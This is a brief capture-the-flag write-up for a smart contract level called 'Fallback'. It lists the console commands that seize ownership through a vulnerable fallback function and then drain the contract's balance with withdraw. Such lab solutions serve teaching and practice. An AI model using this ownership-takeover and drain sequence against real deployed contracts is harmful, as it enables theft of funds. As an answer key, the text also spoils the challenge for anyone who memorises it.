# Fallback

## Description

You will beat this level if:

- you claim ownership of the contract
- you reduce its balance to 0

## Solution

1. Noticed that the fallback function has the ability to change the owner
2. Viewed owner contributions with `await contract.contributions(await contract.owner())`
3. Made a minor contribution with `await contract.contribute({ value: 1 })`
4. Triggered the fallback function (and took ownership) with `await contract.send(1e17)`
5. Drained the contract with `await contract.withdraw()`